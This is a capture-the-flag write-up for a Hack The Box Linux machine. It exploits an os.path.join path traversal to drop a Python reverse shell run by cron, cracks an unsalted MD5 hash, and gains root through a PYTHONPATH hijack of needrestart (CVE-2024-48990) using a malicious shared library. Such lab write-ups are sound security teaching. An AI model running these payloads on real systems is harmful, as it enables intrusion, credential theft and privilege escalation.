# Conversor

## Box Info

- **Difficulty**: Easy
- **OS**: Linux (Ubuntu)
- **Date Completed**: 2026-03-09
- **IP Address**: 10.129.238.31

---

## Enumeration

### Nmap Scan

```bash
nmap -sC -sV -oA nmap/conversor 10.129.238.31
```

**Results:**

- Port 22: SSH  -  OpenSSH on Ubuntu
- Port 80: HTTP  -  Apache 2.4.52

### Web Enumeration

Visiting port 80 takes you to a login/register page. After registering and logging in, the app is a web tool that:

1. Accepts an XML file upload
2. Accepts an XSLT file upload
3. Transforms the XML using the XSLT and outputs an HTML file
4. Serves the result at `/view/<file_id>`

The About page links to a downloadable source code archive (`source_code.tar.gz`). **Always download source code when it's offered  -  it collapses your attack surface immediately.**

---

## Source Code Analysis

Key findings from grepping the source:

**The conversion logic (app.py ~line 95-119):**

```python
xslt_file = request.files['xslt_file']
from lxml import etree

xml_path = os.path.join(UPLOAD_FOLDER, xml_file.filename)   # VULNERABLE
xslt_path = os.path.join(UPLOAD_FOLDER, xslt_file.filename) # VULNERABLE

xml_file.save(xml_path)   # FILE SAVED BEFORE ANY VALIDATION
xslt_file.save(xslt_path) # FILE SAVED BEFORE ANY VALIDATION

try:
    parser = etree.XMLParser(resolve_entities=False, no_network=True, ...) # hardened
    xml_tree = etree.parse(xml_path, parser)
    xslt_tree = etree.parse(xslt_path)  # DEFAULT parser  -  NO restrictions
    transform = etree.XSLT(xslt_tree)
    result_tree = transform(xml_tree)
    result_html = str(result_tree)
    ...
except Exception as e:
    return f"Error: {e}"
```

**Two distinct vulnerabilities are visible here:**

**Vulnerability 1  -  Path Traversal via `os.path.join`:** `os.path.join(UPLOAD_FOLDER, xml_file.filename)` has a known Python gotcha: if the second argument starts with `/`, it **discards everything before it** and treats it as an absolute path. No sanitisation on the filename means you control where files are written on the filesystem.

**Vulnerability 2  -  XSLT parsed with unprotected parser:** The XML is parsed with a hardened parser (`resolve_entities=False`, `no_network=True`). The XSLT is parsed with `etree.parse(xslt_path)`  -  completely default, no restrictions. This means whatever XSLT you upload, lxml will execute faithfully.

**Hardcoded paths found:**

```python
DB_PATH = '/var/www/conversor.htb/instance/users.db'
UPLOAD_FOLDER = os.path.join(BASE_DIR, 'uploads')
# BASE_DIR resolves to /var/www/conversor.htb
```

**Cron job found in source:**

```
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
```

Every minute, `www-data` runs every `.py` file in the scripts directory. This is the execution primitive once we can write there.

---

## Exploitation  -  Initial Foothold

### The Plan

1. Write a Python reverse shell to `/var/www/conversor.htb/scripts/shell.py` by exploiting the `os.path.join` path traversal in the filename
2. Wait for the cron job to execute it
3. Catch the shell with netcat

### Why the Error is a Red Herring

The server validates that uploaded files are parseable XML/XSLT **after** saving them to disk. The code flow is:

```
save file to disk → try to parse → exception thrown → return error message
```

The exception fires and returns `"Error: Start tag expected..."` but **the file is already on disk**. The cron job doesn't care about the app's exception  -  it just runs whatever `.py` files it finds.

### Steps

**1. Set up listener on Kali:**

```bash
nc -lvnp 4444
```

**2. Create the reverse shell payload (save as `shell.py` locally):**

```python
import socket,subprocess,os
s=socket.socket()
s.connect(("YOUR_TUN0_IP",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh"])
```

**3. Upload any valid XSLT file to the converter (nmap.xslt from the site works fine). Intercept the POST request in Burp.**

**4. In the intercepted request, modify the XSLT file's multipart section:**

```
# Change this:
Content-Disposition: form-data; name="xslt_file"; filename="nmap.xslt"
Content-Type: application/xslt+xml

# To this:
Content-Disposition: form-data; name="xslt_file"; filename="/var/www/conversor.htb/scripts/shell.py"
Content-Type: text/plain

# Replace file content with the reverse shell Python code
```

**5. Forward the request.** The app will return an XML parse error  -  ignore it. The file is already written.

**6. Wait up to 60 seconds for the cron to fire.**

```
connect to [10.10.16.26] from (UNKNOWN) [10.129.238.31] 57172
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Shell caught as `www-data`.

---

## Lateral Movement - www-data to fismathack

See Also: [[Credential-Hunting]] | [[Hash-Cracking]]

### Extract credentials from SQLite DB

The DB path was hardcoded in the source. Read it with `strings` to extract the password hashes:

```bash
strings /var/www/conversor.htb/instance/users.db
```

Output contains:

```
fismathack5b5c3ac3a1c897c94caad48e6c71fdec
```

This is an MD5 hash (32 hex chars, no salt  -  classic unsalted MD5).

### Crack with John

```bash
echo "5b5c3ac3a1c897c94caad48e6c71fdec" > hash.txt
john hash.txt --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt
```

**Result: `Keepmesafeandwarm`**

### SSH in

```bash
ssh fismathack@conversor.htb
# password: Keepmesafeandwarm
```

User flag: `/home/fismathack/user.txt`

---

## Privilege Escalation  -  fismathack → root

See Also: [[Linux-Privilege-Escalation]] | [[GTFOBins]]

### Enumeration

```bash
sudo -l
```

Output:

```
(ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```

`fismathack` can run `needrestart` as root with no password.

```bash
needrestart -V
# needrestart 3.7
```

### What is needrestart?

`needrestart` is a utility that checks whether running services or processes need to be restarted after library upgrades. When it runs, it **spawns Python** internally to inspect running processes. This is the key  -  if we can control what Python loads, we get code execution as root.

### CVE-2024-48990  -  needrestart PYTHONPATH Hijack

**The vulnerability:** needrestart reads the environment of running processes from `/proc/<pid>/environ` to determine what libraries they're using. When it finds a Python process, it **inherits that process's PYTHONPATH** when spawning its own Python interpreter. This means you can poison the PYTHONPATH of a running process you own, and needrestart will use it when running as root.

**Why environment variable injection via sudo doesn't work:** `sudo -l` shows `env_reset` with no `env_keep` entries. This wipes all environment variables before executing the command. You can't pass `PYTHONPATH` directly to needrestart through sudo. The trick is to poison it on a **separate process** that needrestart will inspect.

### The Exploit

The exploit has three components:

**`lib.c`  -  malicious shared library (compiled as `importlib/__init__.so`):**

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

static void a() __attribute__((constructor));
void a() {
    setuid(0);
    setgid(0);
    const char *shell = "cp /bin/sh /tmp/exploit/poc; chmod u+s /tmp/exploit/poc &";
    system(shell);
}
```

The `__attribute__((constructor))` tells the compiler to run this function automatically when the shared library is loaded  -  before any other code. When needrestart's Python loads `importlib` and gets your `.so` instead, this fires immediately as root, copying `/bin/sh` to `/tmp/exploit/poc` with the SUID bit set.

**Why `importlib` specifically?** Because needrestart imports it internally. By naming your malicious directory `importlib` and putting it in PYTHONPATH before the real Python library paths, Python loads yours first. It's a classic Python import hijack.

**`e.py`  -  watches for the SUID binary to appear:**

```python
import os
import time

if os.path.exists("/tmp/poc"):
    os.remove('/tmp/poc')

print(f'{42*"#"}\n\nDon\'t mind the error message above\n\nWaiting for needrestart to run...')
while True:
    if os.path.exists("/tmp/exploit/poc"):
        print('Got the shell!')
        os.system('/tmp/exploit/poc -p')
        break
    time.sleep(0.2)
```

**The bash runner (`run.sh`):**

```bash
#!/bin/bash
mkdir -p "$PWD/importlib"
gcc -shared -fPIC -o "$PWD/importlib/__init__.so" lib.c
PYTHONPATH="$PWD" python3 e.py
```

### Why the error messages appear and why they don't matter

When you run `PYTHONPATH="$PWD" python3 e.py`, your current Python session also has PYTHONPATH set. This means `e.py` itself tries to import your malicious `importlib` instead of the real one, causing errors like:

```
ImportError: dynamic module does not define module export function (PyInit_importlib)
```

This is expected and harmless  -  `e.py` only uses `os` and `time`, not `importlib`. The important thing is that the background Python process has the poisoned environment for needrestart to read.

### Execution Steps

**On Kali  -  compile the shared library:**

```bash
mkdir -p importlib
gcc -shared -fPIC -o importlib/__init__.so lib.c
python3 -m http.server 8080
```

**On target  -  transfer and execute:**

```bash
mkdir -p /tmp/exploit/importlib
cd /tmp/exploit
wget http://YOUR_KALI_IP:8080/importlib/__init__.so -O importlib/__init__.so
wget http://YOUR_KALI_IP:8080/e.py

# Run the watcher with poisoned PYTHONPATH in background
PYTHONPATH="$PWD" python3 e.py &

# Trigger needrestart as root  -  it will inspect running processes,
# find your Python process with PYTHONPATH set, and inherit it
sudo needrestart
```

**When it works:**

```
Got the shell!
```

```bash
/tmp/exploit/poc -p
whoami
# root
cat /root/root.txt
```

---

## Why `-p` Flag?

`/bin/sh -p` tells the shell to preserve the effective UID rather than dropping it. Without `-p`, bash/sh will detect that the real UID (fismathack) doesn't match the effective UID (root from SUID) and drop privileges as a security measure. `-p` bypasses this.

---

## Attack Chain Summary

```
Register account
      ↓
Download source code → identify lxml XSLT + os.path.join vulns + cron
      ↓
Burp intercept → path traversal filename → write reverse shell to /scripts/
      ↓
Cron fires → shell as www-data
      ↓
strings on SQLite DB → fismathack MD5 hash
      ↓
john cracks hash → SSH as fismathack → user flag
      ↓
sudo -l → needrestart NOPASSWD
      ↓
CVE-2024-48990 → PYTHONPATH hijack via proc environ poisoning
      ↓
SUID /bin/sh copy → root flag
```

---

## Key Learnings

- **`os.path.join` path traversal**: If the second argument starts with `/`, the base path is discarded entirely. Always a red flag when filenames go directly into `os.path.join` without sanitisation.
- **File saves before validation**: The save happens outside the try/except. An error during parsing doesn't undo the write. Error messages lie  -  always check whether the operation actually failed or just reported failure.
- **Source code is gold**: The cron job, DB path, and both vulnerabilities were all visible before touching the box.
- **CVE-2024-48990**: needrestart inherits PYTHONPATH from processes it inspects via `/proc/<pid>/environ`. `env_reset` in sudoers only affects the direct sudo invocation  -  it doesn't sanitise what needrestart reads from other processes.
- **SUID + `-p`**: SUID binaries running as root still need `-p` flag to prevent privilege dropping in modern shells.
- **Unsalted MD5**: Still common in old/lazy code. Instantly crackable with rockyou.

## Commands Reference

```bash
# Crack hash
echo "HASH" > hash.txt
john hash.txt --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt

# Compile shared library
gcc -shared -fPIC -o importlib/__init__.so lib.c

# Serve files
python3 -m http.server 8080

# Trigger privesc
PYTHONPATH="$PWD" python3 e.py &
sudo needrestart

# Get root shell from SUID binary
/tmp/exploit/poc -p
```

## Tags

#htb #easy #linux #web #xslt #path-traversal #lxml #cron #CVE-2024-48990 #needrestart #python-import-hijack #md5